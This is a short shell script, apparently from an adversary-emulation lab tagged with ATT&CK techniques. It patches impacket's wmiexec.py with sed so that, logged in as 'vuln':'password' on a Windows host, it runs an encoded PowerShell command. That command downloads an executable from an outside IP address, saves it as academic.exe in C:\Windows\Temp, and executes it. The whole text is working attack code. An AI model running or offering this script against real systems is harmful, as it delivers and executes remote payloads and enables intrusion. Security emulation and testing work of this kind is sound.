payload="http://34.212.101.109:6969/test1.exe"
savedir=C:\Windows\Temp\academic.exe
apt update
apt install -y wget python python-pip
pip install impacket
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/wmiexec.py 
conn_string="vuln":"password"@"192.168.151.135"
download_string="(New-Object System.Net.WebClient).DownloadFile('$payload, 'C:\\Windows\\Temp\\academic.exe')" #T1106, T1047
down_string=$(echo $download_string  | iconv -f UTF8 -t UTF16LE | base64)
sed -i '111i ccmd = "powershell -enc $down_string"' wmiexec.py
sed -i '124i \        self.execute_remote(ccmd)' wmiexec.py
sed -i '125i \        self.execute_remote("C:\\\\Windows\\\\Temp\\\\academic.exe")' wmiexec.py 
python wmiexec.py "$conn_string" #T1106, T1047
